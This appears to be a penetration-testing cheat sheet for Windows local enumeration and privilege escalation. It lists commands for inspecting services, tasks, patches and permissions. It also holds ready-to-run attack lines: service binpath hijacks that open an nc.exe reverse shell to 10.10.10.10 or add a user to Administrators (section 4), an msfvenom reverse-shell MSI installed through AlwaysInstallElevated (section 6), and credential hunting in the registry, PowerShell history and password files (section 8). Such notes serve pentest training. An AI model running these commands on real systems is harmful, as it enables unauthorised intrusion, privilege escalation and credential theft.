# Windows Local Enumeration & Privilege Escalation (CRT-Focused)

Goal: Escalate from low-priv user to Administrator or access protected data.



# 1. Initial Context

```
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```

Check:
- OS version
- Privileges
- Group membership



# 2. User Enumeration

```
net user
net localgroup administrators
```



# 3. Check Installed Patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```



# 4. Services (Very Important)

```python
sc query
sc qc <service>

# Check permissions

accesschk.exe /accepteula -quvcw WindscribeService

# ABUSE

sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe" 

sc config <Service_Name> binpath= "net localgroup administrators username /add" 

sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

# Stop and start

net stop [service name] && net start [service name]
sc stop WindscribeService
sc start WindscribeService
```

Check:
- Service running as SYSTEM
- Writable service binary path
- Unquoted service paths



# 5. Scheduled Tasks

```python
schtasks /query /fo LIST /v
```

Check:
- Tasks running as SYSTEM
- Writable task binaries



# 6. AlwaysInstallElevated

Check:

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

If set to 1:
MSI execution as SYSTEM possible.

If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```jsx
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```




# 7. Writable Directories

```
icacls "C:\Program Files\SomeApp"
```

Look for:
- (F) or (M) permissions for Users



# 8. Stored Credentials

```
cmdkey /list
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Check registry:

```
reg query HKLM /f password /t REG_SZ /s
```

Extra

```python
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```



# 9. Unquoted Service Path

If path:

```
C:\Program Files\Some Service\service.exe
```

Without quotes and writable directory in chain → drop malicious exe.

Search for unquoted service paths:

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```


# 10. Token Privileges

If SeImpersonatePrivilege present:

JuicyPotato-type attacks (if allowed).

Check:

```
whoami /priv
```



# 11. UAC Bypass (If admin but limited)

Check if user in Administrators:

```
net localgroup administrators
```



# 12. File System Search

Search for creds:

```
dir /s *pass*
dir /s *.config
```



# 13. Quick Manual Workflow

1. whoami /priv
2. net user
3. net localgroup administrators
4. sc query
5. schtasks /query
6. check writable service paths
7. check AlwaysInstallElevated



# 14. Panic Mode Checklist

```
whoami /priv
net user
net localgroup administrators
sc query
schtasks /query /fo LIST /v
cmdkey /list
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
